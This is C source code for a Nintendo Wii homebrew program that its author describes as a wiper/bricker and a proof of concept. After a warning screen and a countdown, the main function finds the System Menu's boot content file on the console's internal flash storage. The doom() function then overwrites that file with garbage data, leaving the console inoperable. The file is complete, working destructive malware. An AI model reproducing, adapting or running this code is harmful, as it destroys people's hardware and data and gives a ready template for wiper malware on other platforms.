//-------------------------------------------------------------------------------------------------
// 888       888 8888888 8888888 8888888b.         d8888 8888888888P  .d88888b.  8888888b.  
// 888   o   888   888     888   888   Y88b       d88888       d88P  d88P" "Y88b 888   Y88b 
// 888  d8b  888   888     888   888    888      d88P888      d88P   888     888 888    888 
// 888 d888b 888   888     888   888   d88P     d88P 888     d88P    888     888 888   d88P 
// 888d88888b888   888     888   8888888P"     d88P  888    d88P     888     888 8888888P"  
// 88888P Y88888   888     888   888 T88b     d88P   888   d88P      888     888 888 T88b   
// 8888P   Y8888   888     888   888  T88b   d8888888888  d88P       Y88b. .d88P 888  T88b  
// 888P     Y888 8888888 8888888 888   T88b d88P     888 d8888888888  "Y88888P"  888   T88b 
//-------------------------------------------------------------------------------------------------
//      				               WIIRAZOR
//                                   @2021, 2022
//                                Created by Tenor-Z
//-------------------------------------------------------------------------------------------------
//    WiiRazor is a wiper/bricker program written for the Nintendo Wii and is meant to be more of a
//    proof of concept than something that should be spread in the wild. It is NOT the first
//    malware written for the Wii, though over the years of understanding the low level operations
//    of the console, I decided to write this as a demonstration of what I know, and as a bit of a
//    wake-up-call to those that don't think custom firmware comes with its risks.
//--------------------------------------------------------------------------------------------------

#include <gccore.h>
#include <wiiuse/wpad.h>
#include <fat.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <sys/types.h>
#include <sys/param.h>
#include <sys/stat.h>
#include <malloc.h>
#include <fcntl.h>    														// For O_WRONLY and other file flags
#include <unistd.h>    														// For open(), close()
#include <asndlib.h>
#include <mp3player.h>

#include "music_mp3.h"

static void *xfb = NULL;
static GXRModeObj *rmode = NULL;

/*
Just garbage data/leftover pieces from the last rendition of the program. 
HAVE_AHBPROT points to a hardware register to see if hardware protection is turned off
MEM_REG_BASE and MEM_PROT point to registers for the console's RAM write-protection locks
These aren't needed because by we are performing title lookups by calling the official ES_GetStoredTMD and ISFS_Open APIs in DevkitPro.
These work automatically because modern homebrew launchers already disable those restrictions in the background before launching an application.

*/

//#define HAVE_AHBPROT ((*(vu32*)0xcd800064 == 0xFFFFFFFF) ? 1 : 0)			// AHBPROT provides developers full access to the Wii's hardware
//#define MEM_REG_BASE 0xd8b4000
//#define MEM_PROT (MEM_REG_BASE + 0x20a)

//const u16 isfs_old[] = {0x428B, 0xD001, 0x2566};							

int free2display = 1;														// This variable only exists to prevent banner looping

void WARNING();
void BANNER();
void countdown(unsigned int count);
void doom(int fd, size_t bootIndexSize);
void handle_background_music();
void shutdown_subsystems();

/*
Simple loop to check if the music has stopped playing and if so, start it back up again
*/

void handle_background_music() {
    // Check if the MP3 player has run out of data or stopped playing
    if (!MP3Player_IsPlaying()) {
        // Automatically re-trigger the buffer stream from byte 0
        MP3Player_PlayBuffer(music_mp3, music_mp3_size, NULL);
    }
}

/*
This function is responsible for overwriting important files
with garbage data. This is perhaps the simplest method of
bricking possible because it guarantees unrecoverable
damage to system resources and prevents the console from
automatically restoring the damaged files. With this method,
it will assume nothing is wrong since the files still remain
on the NAND, despite their contents being overwritten. 
Here, we provide 16'000 (ish) bytes of useless data to overwrite 
an important file and render it unusable and corrupted.
*/

void doom(int fd, size_t bootIndexSize) {
	char pattern[0x4000]; // Hex data represents 16'384 bytes (16 KB) of garbage data
    const char str[] = "0000000000"; 
    
    // Fill the pattern buffer with the string loop
    for (char* ptr = pattern; ptr < (pattern + sizeof(pattern)); ptr += sizeof(str)) {
        memcpy(ptr, str, sizeof(str));
    }

    while (bootIndexSize) {
        int ret = ISFS_Write(fd, pattern, MIN(sizeof(pattern), bootIndexSize));
        if (ret <= 0) {
            break;
        }
        bootIndexSize -= ret;
    }
}

/* This was more of a nitpicky thing I decided to include but I wasn't satisfied that
the banners were never really 'center' on the screen, despite the various sizes of TV screens
and whatnot, so I wrote a function that will print provided strings to the center of the screen
by calculating the starting column with the width of the screen. It's not perfect, but it suffices*/

void print_perfect_center(int target_row, const char *text) {
    const int SCREEN_WIDTH = 70;
    int text_length = strlen(text);
    
    // Calculate the precise starting column to balance left and right margins
    int start_column = (SCREEN_WIDTH - text_length) / 2;
    
    // Dynamic escape code positioning using standard C formatting variables
    printf("\x1b[%d;%dH%s\n", target_row, start_column, text);
}

void BANNER(){
    if (free2display == 1)
    { 
        // Move the hardcoded ASCII lines to the very top rows (Rows 2-5)
        printf("\x1b[2;12HYb        dP 88 88 88''Yb    db    8888P  dPYb   OO''Yb"); 
        printf("\x1b[3;12H Yb  db  dP  88 88 OO__dP   dPYb     dP  dP   Yb OO__dP"); 
        printf("\x1b[4;12H  YbdPYbdP   88 88 OO'Yb   dP__Yb   dP   Yb   dP 88'Yb");  
        printf("\x1b[5;12H   YP  YP    88 88 88  Yb dP    Yb d8888  YbodP  88  Yb");
        
        // Push the informational text lines right underneath the artwork
        print_perfect_center(7, "@Copyright 2021-2022");
        print_perfect_center(8, "CREATED BY Tenor-Z");
        print_perfect_center(9, "If you bought or downloaded this software from another author");
        print_perfect_center(10, "then this software was OBVIOUSLY STOLEN!! If this is the case,");
        print_perfect_center(11, "uninstall this application and look for an authentic version.");
    }
}


void shutdown_subsystems() {
    MP3Player_Stop();    // Halt audio processing threads
    ASND_End();          // Fixed: Properly close the audio mixer layers
    WPAD_Shutdown();     // Power down wireless controllers
    ISFS_Deinitialize(); // Safely unmount file system hooks
    exit(0);
}

/* This gives the user the ability to exit the process using the HOME or B buttons.
   Rather than using sleep in between wait periods, this function scans for button presses
   during these moments and terminates the program gracefully if they are pressed, saving the
   user from unintentional damage
*/

int interactive_sleep(int seconds_to_wait) {
    for (int i = seconds_to_wait; i > 0; i--) {
        // Run a loop for roughly 60 frames (1 second)
        for (int frame = 0; frame < 60; frame++) {
            WPAD_ScanPads();
            u32 pressed = WPAD_ButtonsDown(0);
            
            // If the user presses HOME or B, cleanly shut down and abort execution
            if (pressed & (WPAD_BUTTON_HOME | WPAD_BUTTON_B)) {
                shutdown_subsystems();
                exit(0); 
            }
            
            // Keep feeding the MP3 decoder so audio doesn't stall during the wait
            handle_background_music();
            
            // Synchronize with the screen refresh rate
            VIDEO_WaitVSync();
        }
    }
    return 1; // Time expired, proceed normally
}

/*
The main function that dictates everything else
*/

int main(int argc, char **argv) {

	VIDEO_Init();															// Initialize controller(s) and the screen
    WPAD_Init();

    ISFS_Initialize();                                                      // Initialize NAND flash filesystem

    ASND_Init();       // Powers up the Wii Audio Subsystem
    MP3Player_Init();  // Initializes the MP3 software decoding layer

    rmode = VIDEO_GetPreferredMode(NULL);
    xfb = MEM_K0_TO_K1(SYS_AllocateFramebuffer(rmode));

    console_init(xfb, 20, 20, rmode->fbWidth, rmode->xfbHeight, rmode->fbWidth * VI_DISPLAY_PIX_SZ);

    VIDEO_Configure(rmode);
    VIDEO_SetNextFramebuffer(xfb);
    VIDEO_SetBlack(FALSE);
    VIDEO_Flush();
    VIDEO_WaitVSync();
    if(rmode->viTVMode&VI_NON_INTERLACE) VIDEO_WaitVSync();

    handle_background_music();                                              // In case it didn't start already
    WARNING();																// Display the warning screen first
    interactive_sleep(15); 
    printf("\e[1;1H\e[2J");
    BANNER();
    interactive_sleep(10); 
    countdown(9);
    

    // Dynamically get the file size of the System Menu using the TMD.
	uint32_t tmdsize = 0;
	int ret = ES_GetStoredTMDSize(0x100000002LL, &tmdsize);
	if (ret < 0) {
		printf("ERROR!! -- Failed to get TMD size of System Menu (%i)\n", ret);
		return ret;
	}

	signed_blob* s_tmd = memalign(0x20, tmdsize);       // Determines how many bytes of RAM we need to reserve to read System Menu metadata without buffer overflow
	if (!s_tmd) {
		puts("ERROR!! -- Out of Memory");
		return -12;
	}

	ret = ES_GetStoredTMD(0x100000002LL, s_tmd, tmdsize);   // Load the System Menu metadata to the previously created memory block
	if (ret < 0) {
		printf("ERROR!! -- Failed to get the System Menu TMD (%i)\n", ret);
		return ret;
	}

	tmd* sm_tmd = SIGNATURE_PAYLOAD(s_tmd);     // Point towards the actual start of structual layout config (Beginning of received metadata starts with RSA signature block)

    // This loop determines where the actual master executable file is located using the obtained System Menu metadata.
    // This differs from version to version and regional variations
	uint32_t bootIndexCID = 0;
	size_t bootIndexSize = 0;
	for (int i = 0; i < sm_tmd->num_contents; i++) {    // Read through the metadata contents one by one until we find the boot_index variable
		tmd_content* con = sm_tmd->contents + i;        // this points to the master executable file
		if (con->index == sm_tmd->boot_index) {
			bootIndexCID = con->cid;            // Obtain the content ID (8 digit hex)
			bootIndexSize = con->size;          // The size of the file
		}
	}

	if (!bootIndexCID) {
		puts("ERROR!! -- Failed to identify boot content");
		return -2;
	}

    char filepath[ISFS_MAXPATH];
	sprintf(filepath, "/title/00000001/00000002/content/%08x.app", bootIndexCID);   // Use the metadata gathered to determine the EXACT path to the master executable file
	int fd = ret = ISFS_Open(filepath, ISFS_OPEN_WRITE);                            // Open it for writing
	if (ret < 0) {
		printf("ERROR!! -- Failed to open boot content (%i)\n", ret);
		return ret;
	}

	doom(fd, bootIndexSize);                                                        // And write the garbage code to it

    // Safely clean up and close the file
    ISFS_Close(fd);
    
    printf("\e[1;1H\e[2J");
    print_perfect_center(11, "======================================");
    print_perfect_center(12, "The process has been completed, and the");
    print_perfect_center(13, "Nintendo Wii has been rendered inoperable.");
    printf("\n");
    print_perfect_center(14, "It is possible to restore via a Priiloader");
    print_perfect_center(15, "backup or a boot2 BootMii backup but it is");
    print_perfect_center(16, "not guaranteed to restore functionality.");
    printf("\n");
    print_perfect_center(17, "It is now safe to turn off your console.");
    print_perfect_center(18, "=======================================");

    while(1) {
        // Scan the physical/emulated controller ports
        WPAD_ScanPads();
        
        // Switch to continuous checking so the button registration isn't missed
        u32 held = WPAD_ButtonsHeld(0);
        if (held & WPAD_BUTTON_HOME) {
            WPAD_Shutdown(); // Cleanly close wireless controller slots
            shutdown_subsystems();
            exit(0);         // Hard exit back to the launcher or emulator core
        }
        
        // Keep feeding the MP3 decoder so the sound chip threads don't deadlock
        handle_background_music(); 

        // Yield execution to the video refresh clock
        VIDEO_WaitVSync();
    }

    return 0;
}

void countdown(unsigned int count) {
    for (unsigned int i = count; i > 0; i--) {
        // Moves the timer to Row 14, Column 0 to avoid overlapping your new layout
        printf("\x1b[14;0HStarting in  %u...\n", i);
        sleep(1);
    }
    free2display = 0;
}

void WARNING() {
    print_perfect_center(2, "WARNING!!");
    print_perfect_center(3, "========================================================");
    print_perfect_center(4, "This program is considered malicious.");
    print_perfect_center(5, " ");
    print_perfect_center(6, "Running this program will brick your Nintendo Wii.");
    print_perfect_center(7, "If you wish to continue with the bricking process, please");
    print_perfect_center(8, "wait 15 seconds. If not, turn off your console immediately.");
    print_perfect_center(9, " ");
    print_perfect_center(10, "I am not responsible for unintentional damage to consoles.");
    print_perfect_center(11, "");
    print_perfect_center(12, "Press Home or B to exit back to the Homebrew Launcher");
    print_perfect_center(13, "========================================================");
}
